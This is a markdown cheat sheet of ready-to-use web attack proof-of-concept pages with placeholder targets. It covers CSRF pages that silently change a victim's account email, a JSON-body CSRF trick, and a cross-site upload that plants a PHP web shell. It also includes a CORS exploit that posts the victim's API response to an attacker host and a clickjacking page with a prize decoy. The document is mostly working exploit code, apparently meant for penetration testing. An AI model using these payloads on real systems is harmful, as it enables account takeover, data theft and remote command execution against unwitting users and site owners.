
## GET CSRF

```html

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; URL=https://example.com/">
</head>
<body>
 <p> hello </p>
</body>
</html>

```

## POST CSRF

```html

<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        /* Ensure absolutely nothing is visible on the page */
        body {
            margin: 0;
            padding: 0;
            background: white;
            display: block;
        }
        /* Hide any potential fallback content */
        form {
            display: none;
        }
    </style>
</head>
<body>
	 <!-- CHANGE URL here -->
    <form id="autoSubmitForm" 
          style="display: none;" 
          method="POST"
          action="https://[CHANGE_ME]/my-account/change-email"
          enctype="application/x-www-form-urlencoded">
        <input type="hidden" name="email" value="toto123@ok.com">
    </form>

    <script>
        // submit the hidden form
        document.getElementById('autoSubmitForm').submit();
    </script>
</body>
</html>

```

## GET CSRF, silent

No navigation, the victim sees nothing. Works while the session cookie is sent on cross-site subresource requests (`SameSite=None`).

```html
<img src="https://[CHANGE_ME]/my-account/change-email?email=toto123@ok.com" style="display:none">
```

## JSON body from a form

`enctype="text/plain"` sends `name=value` unencoded, so a name and value that together form JSON arrive as a JSON document. Only works if the server does not insist on `Content-Type: application/json`.

```html
<!DOCTYPE html>
<html>
<body>
    <!-- sends: {"email":"toto123@ok.com","x":"="} -->
    <form id="f" method="POST" action="https://[CHANGE_ME]/api/email" enctype="text/plain">
        <input type="hidden" name='{"email":"toto123@ok.com","x":"' value='"}'>
    </form>
    <script>document.getElementById('f').submit();</script>
</body>
</html>
```

## File upload CSRF

A multipart POST is a "simple" request, so it goes out without a preflight.

```html
<!DOCTYPE html>
<html>
<body>
    <script>
        const fd = new FormData();
        fd.append('file', new Blob(['<?php system($_GET["c"]); ?>'], {type: 'image/jpeg'}), 'shell.php');
        fetch('https://[CHANGE_ME]/upload', {method: 'POST', body: fd, credentials: 'include', mode: 'no-cors'});
    </script>
</body>
</html>
```

## CORS read PoC

For an API that reflects the `Origin` and allows credentials. Unlike CSRF, this one reads the response.

```html
<!DOCTYPE html>
<html>
<body>
    <script>
        fetch('https://[CHANGE_ME]/api/me', {credentials: 'include'})
            .then(r => r.text())
            .then(t => fetch('https://[ATTACKER]/log', {method: 'POST', mode: 'no-cors', body: t}));
    </script>
</body>
</html>
```

## Clickjacking PoC

The target is framed on top and made nearly transparent; the decoy button sits underneath, where the real button is. Set `opacity` to `0.5` while you line it up, then to `0.0001`.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe { position: absolute; top: 0; left: 0; width: 1000px; height: 700px; opacity: 0.5; z-index: 2; border: 0; }
        #decoy { position: absolute; top: 420px; left: 300px; z-index: 1; }   /* CHANGE to sit under the real button */
    </style>
</head>
<body>
    <button id="decoy">Click here to win a prize</button>
    <iframe src="https://[CHANGE_ME]/my-account"></iframe>
</body>
</html>
```